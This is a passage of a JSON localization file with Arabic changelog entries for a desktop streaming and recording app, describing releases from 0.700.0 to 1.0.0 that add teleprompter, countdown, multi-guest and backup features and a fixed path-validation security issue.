بالشبكة.","changelog.f4bd0df9d9a9":"<strong>التصدير التلقائي لملف MP4 قابل للمشاركة عند الإيقاف (CAP-N75)</strong> — مفتاح تبديل واحد في <strong>الإعدادات ← الخرج</strong>، <em>«احفظ أيضًا نسخة MP4 قابلة للمشاركة بجوار الملف الأصلي»</em> (يظهر فقط عند التسجيل إلى صيغة <code>.frec</code> الخاصة بالتطبيق، و<strong>معطَّل افتراضيًا</strong>). عند اكتمال تسجيل <code>.frec</code>، يكتب تصدير في الخلفية نسخة MP4 قابلة للتشغيل بنقرة مزدوجة بجواره — تظهر في قائمة انتظار ما بعد التسجيل في مربع حوار التسجيلات — عبر مسار الترميز ذاته الذي يستخدمه التصدير اليدوي، مع تسمية آمنة من التعارض. لا يُمسّ الملف الأصلي <code>.frec</code> بلا فقدان أبدًا، وتُوضع النسخة في قائمة الانتظار قبل أي خط أنابيب لما بعد التسجيل كي لا تتمكن خطوة النقل (Move) من نقل الملف الأصلي من تحتها. احتفظ بالملف الأصلي القابل للإنقاذ بعد الانهيار <strong>وأيضًا</strong> احصل على ملف قابل للمشاركة مجانًا.","changelog.8a7525b1492f":"ملاحظات","changelog.684a3421d35f":"وصلت الأعمال التأسيسية (دون إتاحتها للمستخدم في هذا الإصدار): جانب التطبيق من <strong>مصدر المتصفح الحقيقي</strong> (CAP-N77) وبنية CEF القائمة على عملية مساعدة، وواجهة الربط الخاصة بنقل <strong>الكاميرا الافتراضية</strong> — وكلاهما ينتظر أوقات تشغيل موقّعة/قائمة على المكوّنات تُشحن كمراحل فرعية مستقلة. راجع المرحلة 10 في خريطة الطريق.","changelog.1255703a672a":"[1.0.0] — 2026-07-19 (مستقر — تراكبات إنتاج البث وصقل الإطلاق)","changelog.c682627010fd":"<strong>الإصدار المستقر 1.0.0.</strong> تحقّقت بوابة الميزات المئة المعدودة (26 ميزة أساسية CAP-M + 74 ميزة تكميلية CAP-N) في 0.900.0؛ ويشحن هذا الإصدار ميزات صقل الإطلاق الخمس التي أُرجئت إلى 1.0.0 — لوحة العد التنازلي قبل العرض، وشريط التواصل الاجتماعي، ولافتة رسالة الدردشة المميزة، وعمق الميدان للنوافذ المشروطة، وتنظيف سجل المشاهد — إضافةً إلى جولة من إصلاحات المشغّل/الصوت. كل ما هو جديد يُشحن معطَّلًا/غير مربوط افتراضيًا، ويبقى محليًا، ولا يضيف أي اتصال بالشبكة.","changelog.13b71822377f":"<strong>لوحة العد التنازلي «يبدأ قريبًا» (V1-C)</strong> — بنقرة واحدة من إضافة مصدر: عدّ تنازلي يملأ اللوحة بأكملها (تسمية توضيحية فوق ساعة كبيرة) يعدّ تنازليًا حتى وقت فعلي يُختار من أداة اختيار ساعة بنظام 12 ساعة (الساعات 1–12، والدقائق بخطوات من 5 دقائق، AM/PM). عند الصفر <strong>يومض ويثبت</strong> — يزيله المقدّم وينتقل إلى البث المباشر يدويًا، دون أي تبديل تلقائي أبدًا. الخلفيات: تدرّج من لونين، أو لون خالص، أو صورة ثابتة (مضمَّنة بملاءمة احتواء، في المنتصف، دون اقتصاص أبدًا)، أو <strong>GIF/فيديو</strong> يعمل على خلفية المشهد المتكررة — مع <strong>موسيقى خلفية</strong> اختيارية (mp3/wav/flac/m4a/aac/ogg/opus) تُختار في مربع الحوار ذاته. يُدمج العد التنازلي في البرنامج، لذا يراه مشاهدو البث/التسجيل.","changelog.110b8b024a21":"<strong>مصدر الموسيقى الخلفية</strong> — إضافة مصدر ← موسيقى خلفية…: ملف صوتي واحد أو أكثر كقائمة تشغيل غير مرئية متكررة (مع خلط عشوائي اختياري)، تخضع للمراقبة تلقائيًا فتُسمع في المعاينة وتُلتقط في التسجيل/البث؛ وإضافتها تكتم صوت خلفية الفيديو نفسه كي <strong>لا يُشغَّل إلا صوت خلفية واحد في أي وقت</strong>.","changelog.6c522580be6b":"<strong>مصدر شريط التواصل الاجتماعي والقنوات (V1-D)</strong> — تراكب مُولَّد يسرد معرّفات حساباتك: صفوف منصات مضمَّنة (YouTube وTwitch وKick وX وInstagram وTikTok وFacebook وDiscord) كشارات بألوان العلامات التجارية، إضافةً إلى صفوف مخصصة وترويسة اختيارية؛ ويمكن تحرير كل صف/معرّف في الخصائص.","changelog.9d0f60a20a05":"<strong>لافتة رسالة الدردشة المميزة (V1-E)</strong> — اختر أي سطر دردشة حديث (من جميع تراكبات الدردشة العاملة) وثبّته في البرنامج كلافتة سفلية منسّقة؛ تُحفظ الألوان في الإعدادات، أما التثبيت نفسه فمؤقت عن قصد. يُزال بنقرة واحدة.","changelog.18f4b83dbd99":"<strong>عمق الميدان للنوافذ المشروطة (V1-A)</strong> — كل نافذة مشروطة تُموّه الاستوديو خلفها وتعتّمه (بما يراعي السمة، ويحترم تفضيلات تقليل الحركة/الشفافية)؛ وتبقى الواجهات المرافقة مثل جهاز التلقين دون تمويه كي يواصل المشغّل القراءة.","changelog.501b690add0e":"<strong>تنظيف سجل المشاهد (V1-B)</strong> — قائمة بالمشاهد الأخيرة مع <strong>مسح السجل</strong> بنقرة واحدة (بعد التأكيد)، إضافةً إلى مجموعة المشاهد ← مسح السجل لحذف المجموعات غير المرغوب فيها دفعة واحدة (لا تُمسّ المجموعة النشطة أبدًا).","changelog.c993200abe94":"<strong>الألوان الكلاسيكية لمُصوِّر الصوت</strong> — مربع اختيار في الخصائص يحوّل الأعمدة/مقاييس VU إلى تدرّج البث الكلاسيكي الأخضر ← الأصفر ← الأحمر (ويحصل راسم الذبذبات على الأخضر الفوسفوري)؛ وعند إيقافه = لون واحد خالص.","changelog.2581bdff5166":"<strong>تسجيل البروفة</strong> — أصبح بدء البروفة يعرض أيضًا تسجيلها في ملف فيديو عادي (فقط عندما لا يكون هناك تسجيل جارٍ بالفعل؛ ويتوقف التسجيل مع البروفة)، لذا يمكن أن تصبح التجربة نسخة أصلية جاهزة للتحرير والرفع دون البث المباشر أبدًا.","changelog.3d3a4c1d8909":"<strong>لم يكن لقائمة تشغيل الوسائط شريط في المازج</strong> — كانت قائمة أنواع الصوت في الواجهة تفتقد <code>playlist</code> (و<code>replayPlayback</code>)، لذا لم يكن ممكنًا خفض قوائم التشغيل أو كتمها أو مراقبتها؛ وأصبح لكليهما الآن شريط.","changelog.5a87688dfb99":"<strong>واجهة قائمة التشغيل الصوتية فقط</strong> — أصبحت تعرض <strong>اسم المقطع الحالي</strong> (نص نظيف، دون مربع رموز معطوب)؛ أما قوائم تشغيل الموسيقى الخلفية فلا ترسم شيئًا على الإطلاق. قوائم تشغيل الفيديو بلا تغيير.","changelog.7f672b15fac6":"<strong>ملاءمة العد التنازلي/الخلفية</strong> — أصبحت خلفيات الصور/GIF/الفيديو تُعرض بأشرطة (احتواء) وفي المنتصف بدلًا من الاقتصاص للتغطية، لذا تظهر الصورة كاملة دائمًا.","changelog.fb60af02a1ed":"<strong>جولة المراجعة (قبل الإصدار)</strong> — رصدت مراجعة الأمان مشكلة واحدة بدرجة HIGH: كان مسار صورة لوحة العد التنازلي يُقرأ في حلقة العرض دون حارس مسارات الشبكة الذي تملكه كل المسارات المماثلة (فمسار UNC كان سيسرّب تجزئة NTLM إلى مجموعة مشاهد معادية) — وأصبح يُرفض مسبقًا الآن. ورصدت مراجعة الشيفرة 11 مشكلة أخرى، أُصلحت جميعها: حالة panic في حلقة العرض على اللوحات الأضيق من 240 px، وعلم قديم لتسجيل البروفة قد يوقف تسجيلًا بدأه المستخدم يدويًا، وقائمة المشاهد الأخيرة تعرض المشهد الموجود أصلًا في البرنامج (والتراجع/الإعادة يُرجعان تلك القائمة الخاصة بالجلسة فقط)، وتغييرات لون اللافتة لا تعيد رسم لافتة مثبتة مسبقًا، وأداة اختيار الساعة تقرّب بصمت الأوقات المستهدفة القديمة التي لا تقع على مضاعفات 5 دقائق، وصورة لوحة فاشلة تعيد المحاولة (وتسجّل) كل ثانية، وصورة PNG شفافة للوحة تُعرض معتمة، وتكرارات متنوعة أصبحت الآن مشتركة (قائمة واحدة لامتدادات الصوت، وأداة اختيار ساعة واحدة، ورسّام واحد للمستطيلات مستديرة الزوايا).","changelog.c5d49f26f5b2":"[0.910.0] — 2026-07-19 (إعادة صياغة جهاز التلقين)","changelog.f500d8210c1a":"<em>جهاز التلقين ينضج.</em> إعادة صياغة مركّزة لجهاز التلقين الذي شُحن في 0.800.0: تصبح الوقفات كائنات حقيقية لا يمكن العبث بها بضغطة خاطئة، ويمكن ضبط سرعة التمرير على إيقاع أغنية، ويمنح عدّ تمهيدي اختياري المؤدي إشارة البدء، ويعيد جهاز العرض النافذة الرئيسية إلى المشغّل، ويستطيع النص قراءة نفسه بصوت عالٍ أو إكمال كلماتك أثناء الكتابة. كل ما هو جديد محلي ومعطَّل/محايد افتراضيًا — قواميس الإكمال التلقائي ملفات بيانات محلية بسيطة (تُحمَّل عند الحاجة، لغة واحدة في كل مرة)، والقراءة بصوت عالٍ تنطق عبر محرك الصوت الخاص بنظام التشغيل نفسه؛ لا شيء مضمَّن ولا شيء يُجلب.","changelog.fd0ed8487a73":"<strong>رقائق الوقفات (Caesura)</strong> — الوقفة المضمَّنة في السطر المكتوبة على شكل <code> -- </code> (نبضة) أو <code> --N </code> (توقف لمدة N ثانية) أصبحت تُعرض في محرر النص كحبة ذرّية واحدة: لا يمكن أن يستقر المؤشر داخلها، وضغطة واحدة على <strong>Delete/Backspace</strong> تزيل الرمز كاملًا (دون أن تبقى شرطة شاردة أبدًا)، والنسخ/اللصق ينقل العلامة سليمة. تُقرأ الوقفة وتُحرَّر ككائن واحد بدلًا من أربعة أحرف متفرقة.","changelog.29694897048a":"<strong>بدء العد التنازلي</strong> — عدّ تمهيدي اختياري <strong>3-2-1</strong> قبل أن يبدأ التمرير، يظهر في معاينة المشغّل وفي جهاز عرض المؤدي معًا، ليحظى القارئ بلحظة لالتقاط أنفاسه قبل أن يتحرك النص.","changelog.645e73577cff":"<strong>وضع BPM</strong> — اضبط سرعة التمرير بـ <strong>النبضات في الدقيقة (50–250)</strong> بدلًا من الأحرف في الثانية، لقراءة كلمات الأغاني متزامنة مع الموسيقى. بدّل بين الأوضاع بحرية؛ وأي تغيير يعيد ضبط سرعة التمرير الجاري <strong>مباشرةً</strong>.","changelog.a1ef18efc830":"<strong>أيقونات تحكم حقيقية بالتشغيل</strong> — أصبح جهاز العرض ولوحة المشغّل يحملان عناصر تحكم <strong>SVG</strong> حقيقية للتشغيل / الإيقاف المؤقت / الإيقاف / الترجيع / التقديم السريع / إعادة البدء بدلًا من الرموز المؤقتة.","changelog.ccfc933d79f9":"<strong>جهاز العرض يحرّر النافذة الرئيسية</strong> — أصبح فتح جهاز عرض المؤدي <strong>يغلق النافذة المشروطة للمشغّل</strong>، لتتمكن من إدارة بثك المباشر من النافذة الرئيسية بينما يقرأ المؤدي. ومع تجهيز عدّ تنازلي للبدء، فإن جهاز العرض عند فتحه <strong>يرجع تلقائيًا إلى البداية، ويعدّ تنازليًا، ويشغّل من البداية</strong> — إجراء واحد يضع القارئ عند الصفر وينطلق.","changelog.90ca5a72ccb0":"<strong>القراءة بصوت عالٍ</strong> — عاين النص عبر <strong>تركيب الكلام الخاص بنظام التشغيل نفسه</strong> — <strong>SAPI 5 / OneCore</strong> في Windows، و<strong>AVSpeechSynthesis</strong> في macOS، وعلى Linux واجهة Web Speech API أو بديل احتياطي <strong><code>spd-say</code> / <code>espeak-ng</code></strong> حيثما كان مثبتًا. لا يُضمَّن أي محرك لتحويل النص إلى كلام (TTS)؛ ويُستخدم صوت نظام التشغيل كما هو. راجع <code>THIRD-PARTY.md</code>.","changelog.5689e3adcf62":"<strong>الإكمال التلقائي بالنص الشبحي</strong> — تظهر اقتراحات كلمات وعبارات باللون الرمادي الفاتح ضمن السطر أثناء الكتابة، وتُقبل بالضغط على <strong>Tab</strong>. لكل لغة من <strong>لغات التطبيق الـ18</strong> قاموسها الخاص، الذي يُحمَّل عند الحاجة للغة التي تكتب بها فقط. مصادر القواميس وتراخيصها <strong>CC-BY / المتساهلة</strong> (Tatoeba وSCOWL وLeipzig Corpora وOpenTaal و…) مدرجة في <code>THIRD-PARTY.md</code>.","changelog.f1248a45cf83":"<strong>تطابق التفاف الأسطر بين المعاينة ↔ جهاز العرض</strong> — أصبحت الأسطر تلتف عند النقاط ذاتها في معاينة المشغّل وفي جهاز العرض بملء الشاشة، لذا فإن السطر الذي تُشير إليه هو السطر الذي يقرؤه المؤدي. يعرض جهاز العرض النص على مسرح ثابت الحجم يُحجَّم عبر CSS ليلائم الشاشة، لذا لم يعد ممكنًا أن يقع فاصل السطر في مكان مختلف على الشاشة الكبيرة.","changelog.33a14cdb624d":"<strong>مؤقّت الوقت المنقضي في شريط التقدّم</strong> — لم يعد عرض الوقت المنقضي يرتفع <strong>إلى ما بعد</strong> إجمالي وقت القراءة؛ بل يتوقف عند النهاية بدلًا من مواصلة العد إلى الأبد بعد انتهاء تمرير النص بالكامل.","changelog.a757a5cd6973":"<strong>لا تبعية تشغيل مضمَّنة جديدة ولا اتصال جديد بالشبكة.</strong> قواميس الإكمال التلقائي بيانات JSON محلية (ملف واحد لكل لغة، يُحمَّل عند الطلب للغة النشطة)، والقراءة بصوت عالٍ تستخدم محرك الكلام الموجود أصلًا على الجهاز — لا يُجلب شيء وقت التشغيل. توجد إشارات نسب البيانات ومحركات الكلام في <code>THIRD-PARTY.md</code>. كل عنصر تحكم ووضع جديد مترجم إلى اللغات الـ18 جميعها.","changelog.6c151934cc4a":"[0.900.0] — 2026-07-18 (إدارة الاستوديو وسير العمل — المرحلة 8)","changelog.db7b34e4b837":"<em>امتلك استوديوك.</em> تجعل المرحلة 8 التخطيط بأكمله قابلًا للنقل والمشاركة، وتضيف التحكم في الإصدارات لمشاهدك، وتضع أكثر إجراءاتك استخدامًا على بُعد نقرة واحدة، وتتيح تخصيص السمات بالكامل ووضعًا محمولًا يعمل من ذاكرة USB. كل شيء محلي حصرًا — لا تبعيات جديدة ولا اتصالات جديدة بالشبكة.","changelog.197ef0e08085":"<strong>حزمة مجموعة المشاهد — تصدير/استيراد (CAP-N60)</strong> — اجمع تخطيطًا كاملًا (مخطط المشاهد مع أصوله المحلية: الصور، والوسائط، وجداول LUT، والأقنعة، والخطوط) في ملف <code>.fcappack</code> واحد قابل للنقل وشاركه كملف واحد. يعيد الاستيراد ربط الأصول على الجهاز الهدف؛ وتُسجَّل مسارات URL/UNC بوصفها <em>خارجية</em> ولا يُستعلم عن حالتها أبدًا؛ وتُعلَّم الخطوط لغرض النسب. لا متجر، ولا خادم.","changelog.1993c99e5fa2":"<strong>مقارنة مجموعات المشاهد ودمجها (CAP-N61)</strong> — قارن المجموعة النشطة بمجموعة أخرى، أو بملف <code>.fcappack</code>، أو بلقطة؛ واطّلع على المشاهد والمصادر المضافة / المحذوفة / المتغيرة، وعلى التحويل / الفلاتر / الظهور لكل عنصر؛ ثم <strong>انتقِ</strong> بدقة التغييرات التي تريد دمجها (المشهد المنتقى يجلب معه المصادر التي يستخدمها). وفّق بين نسختين دون سحابة.","changelog.e1355c54d6d7":"<strong>لقطات إصدارات مسمّاة (CAP-N62)</strong> — نقاط حفظ مسمّاة للمجموعة النشطة بنقرة واحدة، مع خط زمني قابل للتصفح، واستعادة، وعرض للفروق (يعيد استخدام أداة المقارنة). سجل مقصود إلى جانب الحفظ التلقائي والتراجع؛ بحد أقصى 50 لقطة مع إظهار مساحة القرص المستخدمة، ونقطة حفظ «قبل الاستعادة» كي لا تكون الاستعادة باتجاه واحد أبدًا.","changelog.afc196f3991b":"<strong>الوضع المحمول (CAP-N63)</strong> — ضع ملف العلامة <code>freally-portable.txt</code> بجوار الملف التنفيذي، فتصبح جميع بيانات التطبيق (الإعدادات، وملفات التعريف، والمجموعات) داخل مجلد الملف التنفيذي — شغّل الاستوديو بأكمله من ذاكرة USB دون المساس بملف تعريف نظام التشغيل المضيف. تعرض الإعدادات ← حول حالة الوضع المحمول وموقع البيانات.","changelog.4072af7dcc85":"<strong>النسخ الاحتياطي والاستعادة في ملف واحد (CAP-N64)</strong> — صدّر كل شيء (الإعدادات، وملفات التعريف، ومجموعات المشاهد) إلى ملف <code>.fcapbackup</code> واحد ذي إصدار، واستعده بشكل انتقائي هنا أو على جهاز جديد (مسار ترحيل). تُجرَّد الأسرار — مفاتيح البث وكلمات المرور — دائمًا من النسخة الاحتياطية؛ وتُحفظ الحقول التي يملكها الخادم (اتفاقية الترخيص EULA، والإعداد الأولي، وملفات تعريف الكاميرا) عند الاستعادة.","changelog.6b0e17039cce":"<strong>محرر السمات (CAP-N65)</strong> — محرر مرئي لسمة متغيرات CSS: صمّم لوحة الألوان الستة كاملة مع تحذيرات <strong>تباين WCAG</strong> المباشرة، وصدّر/استورد ملفات <code>.fctheme</code> قابلة للمشاركة.","changelog.1f2d5f8ca405":"<strong>إعدادات مسبقة لتخطيطات الإرساء (CAP-N66)</strong> — احفظ تخطيطات عرض مسمّاة (ظهور لوحة الإحصاءات المرساة + اتجاه المازج) وبدّل بينها.","changelog.a66f42ada61a":"<strong>البحث في الإعدادات والتغييرات الأخيرة (CAP-N67)</strong> — حقل بحث في نافذة الإعدادات (كل فئة مفهرسة بالكلمات المفتاحية، مع الانتقال المباشر إليها) إضافةً إلى علامة «تغيّر منذ الفتح» لكل فئة.","changelog.5331e00f8cd2":"<strong>شبكة الإجراءات السريعة (CAP-N68)</strong> — لوحة أزرار قابلة للتخصيص على طراز Stream Deck (المشاهد، والأوامر، والماكرو، ووسائد لوحة الأصوات) مع لون وصفحات لكل زر؛ تُطلق أزرار الأوامر إجراءات الاستوديو ذاتها المدرجة في قائمة السماح التي تُطلقها الاختصارات ولوحة الشبكة المحلية، وإعدادات الشبكة <strong>مشتركة مع لوحة الشبكة المحلية CAP-N06</strong>.","changelog.5217d787621c":"<strong>جهاز عرض التلقين</strong> — كان «فتح جهاز العرض» يفتح نافذة فارغة لا يمكن إغلاقها (كانت بلا حدود ولا شريط عنوان، وكان اتصال IPC الخاص بها غير مصرَّح به). أصبحت الآن تُفتح كنافذة عادية قابلة للإغلاق تعرض النص المتحرك؛ ويغلقها <strong>Esc</strong>. كما أصبح <strong>ملف ← خروج</strong> يُنهي التطبيق بشكل موثوق (كانت النافذة الرئيسية تفتقد إذن إغلاق النافذة).","changelog.a9bceee9f47d":"<strong>مربع حوار جهاز التلقين</strong> — زر <strong>إيقاف</strong> (إيقاف مؤقت + ترجيع إلى البداية) كي لا يبدو النص القصير فارغًا بعد التشغيل، ويمكن إعادة قراءة النص وتحريره.","changelog.2e825abc071d":"<strong>لوحة المصادر</strong> — كانت عناصر الإزالة وإعادة الترتيب الخاصة بكل مصدر لا تظهر إلا عند التمرير فوقها، وقد تُقتطع خارج الشريط الجانبي؛ أصبح لكل مصدر الآن <strong>شريط تحكم علوي</strong> ظاهر دائمًا (مباشر/تسجيل · قفل · إعادة ترتيب · الفلاتر · الخصائص · استنساخ · إزالة).","changelog.78b6f1cfd693":"<strong>لا تبعيات جديدة</strong> (كانت الحزمة <code>zip</code> مضمَّنة بالفعل) و<strong>لا اتصالات جديدة بالشبكة</strong>: ميزات الحزمة / النسخ الاحتياطي / اللقطات / السمات ملفات محلية حصرًا؛ ومشاركة الإجراءات السريعة عبر الشبكة المحلية تعتمد على لوحة الويب الاختيارية الموجودة CAP-N06. رُفع <code>wix.version</code> من 0.253.0 إلى 0.254.0 (الحد الأقصى للإصدار الفرعي في MSI).","changelog.871a49bf7084":"[0.800.0] — 2026-07-17 (الضيوف عن بُعد وإنتاج العروض — المرحلة 7)","changelog.72750cf3fb55":"<em>من «اتصال الضيوف» إلى «عرض مُنتَج».</em> تحوّل المرحلة 7 جلسة الضيوف عن بُعد إلى استوديو متعدد الضيوف، وتضيف فوقها طبقة الإنتاج المباشر: الرسم على البرنامج المباشر، وتشغيل جهاز التلقين، وإبقاء الضيوف في غرفة الانتظار قبل ظهورهم على الهواء، وإرسال إشارات خاصة إليهم، ومتابعة جودة اتصال كل ضيف، وإعادة ترتيب الجميع في شبكة تلقائية. أصبح نقل الضيوف عن بُعد يستقبل <strong>ما يصل إلى ثمانية ضيوف</strong> (المضيف + 8 = معرض من 1–9). كل شيء يعمل عبر جلسة P2P الاختيارية الموجودة — لا وسطاء جدد، ولا خادم يديره Mike، ولا شيء يتصل تلقائيًا — وكل واجهة جديدة معطَّلة أو غير مربوطة افتراضيًا.","changelog.c6ee3e56912f":"<strong>أداة الرسم — الرسم على البرنامج المباشر (CAP-N57)</strong> — أضف تعليقات توضيحية على البث الصادر بأدوات القلم وقلم التمييز والسهم والقطع الناقص، تُدمج في البرنامج فتظهر العلامات في التسجيل والبث لحظة رسمها (لا في معاينتك فقط). تتلاشى العلامات بعد وقت محدد، أو انتقل إلى وضع السبورة للإبقاء عليها حتى تمسحها. يدعم حساسية الضغط في الأجهزة اللوحية؛ مع اختصار للمسح (غير مربوط حتى تعيّنه). يُرسم مباشرةً فوق البرنامج النهائي، لذا يصل إلى كل مخرج — بما في ذلك متغيرات CAP-N53 الخاصة بالبث فقط / التسجيل فقط.","changelog.2b2452ceb3fd":"<strong>جهاز التلقين (CAP-N58)</strong> — نص يتمرّر بسلاسة على ثلاث واجهات في آن واحد: لوحة داخل التطبيق، وجهاز عرض بملء الشاشة للمؤدي (مع وضع المرآة لزجاج مُقسِّم الشعاع)، وعرض على لوحة اللمس عبر الشبكة المحلية. نصوص بنص عادي أو بـ Markdown خفيف، مع سرعة وخط قابلين للضبط. التحكم في التمرير من اختصار أو MIDI أو OSC أو لوحة الشبكة المحلية — إزاحة التمرير مشتركة، لذا تبقى كل الواجهات متزامنة.","changelog.eba68ba03d3d":"<strong>غرفة الانتظار للضيوف عن بُعد (CAP-N54)</strong> — يمكن أن يصل الضيوف الجدد إلى حالة انتظار خاصة: ترى الكاميرا الخاصة بهم وفحصًا تقنيًا للكاميرا/الميكروفون في شاشة مراقبة، خارج البرنامج، ثم تُدخلهم على الهواء بنقرة واحدة. اختياري (معطَّل افتراضيًا)؛ ويرى الضيف لافتة «أنت في غرفة الانتظار» في تطبيق سطح المكتب وفي صفحة الانضمام على الويب كليهما.","changelog.7576d4597bb5":"<strong>نظام الإشارات والتحدث (CAP-N55)</strong> — أرسل إلى ضيف متصل إشارات نصية خاصة («30 ثانية»، «اختم»، «دورك التالي»، «ارفع صوتك») عبر قناة بيانات P2P الموجودة. يرى الضيف الإشارة مع عدّ تنازلي مباشر في صفحة الانضمام أو التطبيق لديه — ولا تظهر في البرنامج أبدًا. لا واجهة شبكة جديدة.","changelog.8eed1deed31f":"<strong>لوحة معلومات جودة اتصال الضيوف (CAP-N56)</strong> — ملخّص مباشر لجودة الخدمة (QoS) لكل ضيف: زمن الذهاب والإياب، وفقدان الحزم، والدقة ومعدل الإطارات المستلَمين، والتذبذب (jitter)، مع شارة خضراء/كهرمانية/حمراء ومخطط مصغّر للسجل، لتظهر عبارة «اتصالك يتدهور» قبل أن يلاحظ المشاهدون.","changelog.a49bc0c0f6ee":"<strong>تخطيطات الضيوف بالشبكة التلقائية (CAP-N59)</strong> — رتّب الضيوف الموجودين على الهواء في شبكة تلقائية من 1–9 يُعاد ترتيبها عند انضمام الضيوف أو مغادرتهم أو إدخالهم على الهواء، مع نشر اسم كل مقعد كمتغير <code>{{guestN}}</code> ليصبح مصدر العنوان لوحة اسم تتحدث تلقائيًا. لا تداخل بحكم التصميم.","changelog.5b7dd4b9a43f":"<strong>جلسات عن بُعد متعددة الضيوف</strong> — أصبح نقل الضيوف عن بُعد الاختياري يستقبل <strong>ما يصل إلى ثمانية ضيوف</strong> في آن واحد (بعد أن كان ضيفًا واحدًا)، لكلٍّ منهم مربعه الخاص مع بوابات الكتم الخاصة به، وجودة الاتصال، وقناة الإشارات، والإدخال على الهواء بنقرة واحدة. لا تزال الجلسة نفسها من نظير إلى نظير — تتدفق الوسائط مباشرةً بين المضيف والضيوف، دون خادم، ولا يتصل شيء حتى تدعو أحدًا. جرى التحقق منها ضمن ميزانية الأداء لأربعة ضيوف؛ أما الضيوف الإضافيون فيعتمدون على عرض النطاق ووحدة المعالجة المركزية لدى المضيف.","changelog.c35af444edf6":"[0.700.0] — 2026-07-17 (موثوقية البث ورؤى الأداء — المرحلة 6)","changelog.82098fd2d64d":"<em>تدرّب، قِس، فسّر.</em> تدور المرحلة 6 حول التأكد من أن عرضك سيصمد قبل أن تبدأ البث، وفهم ما حدث بعده. يمكنك الآن تشغيل خط الأنابيب بأكمله مقابل مصبّ محلي خاص مع شبكة سيئة محاكاة، وقياس ما يستطيع جهازك تحمّله فعلًا، ومشاهدة خط زمني مسجَّل لكل حدث عرض/ترميز/إعادة اتصال، والحصول على تقرير مكتوب عند انتهاء البث — إضافةً إلى تعليم أي مصدر بأنه للبث فقط أو للتسجيل فقط. كل شيء معطَّل/محايد افتراضيًا، ولا شيء هنا يضيف اتصالًا بالشبكة: التشغيل التجريبي وقياس الأداء محليان بالكامل، ومحاكي الشبكة لا يُضعف إلا مصبّات الاسترجاع (loopback) الخاصة بالبروفة — ولا يمسّ بثًا حقيقيًا أبدًا.","changelog.be9efbd98807":"<strong>محاكي ظروف الشبكة (CAP-N48)</strong> — مُشكِّل شبكة للبروفات فقط: حدود حتمية لعرض النطاق بطريقة دلو الرموز (token-bucket)، وزمن انتقال/تذبذب مُضاف، وانقطاعات مجدولة، تُطبَّق على مصبّات التشغيل التجريبي لتتمكن من التدرب على سلوك إعادة الاتصال، وعزل مسارات البث المتعدد، وخيارات معدل البت مقابل وصلة رفع ضعيفة ومتقطعة قبل يوم العرض. إعدادات مسبقة لـ «واي فاي فندق» ولنقطة اتصال جوال، إضافةً إلى ملف تعريف مخصص بالكامل. حتمي (التمرين نفسه في كل تشغيل)، وغير قادر، بحكم التصميم، على المساس بعملية «بدء البث» حقيقية.","changelog.37e19bbed36e":"<strong>وضع التشغيل التجريبي / «بدء البث (بروفة)» (CAP-N49)</strong> — شغّل خط أنابيب البث المباشر بأكمله — المُركِّب، والمُرمِّز، والدمج (mux)، ومنطق إعادة الاتصال الحقيقي — مقابل مصبّ استرجاع خاص بالتطبيق، مع لوحة الإحصاءات الحقيقية، وواجهة حالة «مباشر»، والتنبيهات، فيُجرى العرض بأكمله كبروفة دون <strong>أن يغادر الجهاز أي بايت</strong>. زر «بروفة» بنفسجي مميز، وشارة «بروفة» على كل واجهة مباشرة، ولافتة حالة، تجعل الخلط بين البروفة والبث الحقيقي مستحيلًا؛ ولا تُقرأ مفاتيح البث أصلًا، لذا يعمل التشغيل التجريبي قبل العرض حتى قبل وجود المفاتيح.","changelog.85d495ae89bc":"<strong>خط زمني جنائي للإطارات المُسقَطة (CAP-N50)</strong> — خط زمني مسجَّل يمتد طوال الجلسة يربط بين زمن العرض، وعمق قائمة انتظار المُرمِّز، ومعدل البت والإسقاطات لكل وجهة، وعمليات إعادة الاتصال، وتبديلات المشاهد، والعلامات، والتنبيهات على رسم بياني واحد قابل للتكبير — الإجابة عن سؤال «ماذا حدث في الدقيقة 43؟» بعد وقوعه. تعرض لوحة الإحصاءات <em>الآن</em>؛ أما هذا فيسجّل الجلسة بأكملها ويفسّرها، بأخذ العينات خارج حلقة العرض كي لا يُضاف أي عمل إلى مسار التركيب بمعدل 60 fps.","changelog.bb50bfcb281c":"<strong>تقرير جلسة البث (CAP-N51)</strong> — عند انتهاء الجلسة، تقرير محلي اختياري بصيغتي HTML + Markdown يُكتب بجوار التسجيل: مدة التشغيل، ومتوسط معدل البت وذروته لكل وجهة، ونسبة وقت التوقف، وسجل إعادة الاتصال، والعلامات، والتنبيهات، ومسارات التسجيل. محلي فقط، ولا يشاركه أحد سواك؛ معطَّل افتراضيًا.","changelog.fbfd2e9fc49b":"<strong>معالج قياس أداء المُرمِّزات (CAP-N52)</strong> — قياس أداء موجَّه يعمل دون اتصال بالكامل، <em>يشغّل</em> فعلًا سلالم ترميز قصيرة (كل مُرمِّز مكتشف × إعداد مسبق × دقة × fps) على جهازك، ويقيس معدل fps المُحقَّق والهامش المتاح، ويوصي بإعدادات اللوحة/المُرمِّز/معدل البت بناءً على القياسات — مع تطبيق بنقرة واحدة. تُدرج حالات الفشل ولا تُخفى أبدًا، لذا فإن المُرمِّز الذي يوفره جهازك لكنه لا يستطيع تحمّله يُوثَّق بدلًا من استبعاده بصمت. يختلف عن معالج التشغيل الأول، الذي يكتفي بفحص القدرات وتطبيق قواعد تقديرية؛ أما هذا فيقيس. يُرفض أثناء البث المباشر أو التسجيل كي لا يستحوذ على المُرمِّز في منتصف العرض أبدًا.","changelog.7893b3df0384":"<strong>ظهور المصادر حسب المخرج (CAP-N53)</strong> — علّم أي عنصر في المشهد بأنه ظاهر في البث دون التسجيل، أو العكس، ضمن لوحة واحدة — أبقِ التنبيهات والدردشة في البث المباشر بينما يبقى تسجيل الفيديو عند الطلب (VOD) نظيفًا. مفاتيح تبديل <strong>مباشر</strong> / <strong>تسجيل</strong> تظهر عند التمرير على كل صف مصدر؛ ولا يزال مفتاح العين الرئيسي يتحكم في كل شيء، وتعرض معاينة المشغّل وأجهزة العرض والعرض المتعدد البرنامج كاملًا دائمًا.","changelog.fd1925b97ec5":"<strong>مؤثرات النص المتكرر والإعلانات (Text FX)</strong> — ثلاثة فلاتر عناصر جديدة موجهة لحلقات الترويج/الإعلانات التي تعمل دون إشراف: فلتر <strong>منظور</strong> يُميل أي مصدر (نص، كاميرات، التقاطات) بعيدًا عن المشاهد كمستوى مسطح مع تلاشٍ اختياري عند الحافة البعيدة — اربطه بعد فلتر <strong>تمرير</strong> اللانهائي الموجود للحصول على نص افتتاحي زاحف كامل على طريقة «Star Wars» — وفلتر <strong>حلقة تلاشٍ</strong> يُظهر العنصر تدريجيًا، ويثبّته، ثم يُخفيه تدريجيًا، ويبقيه مخفيًا في 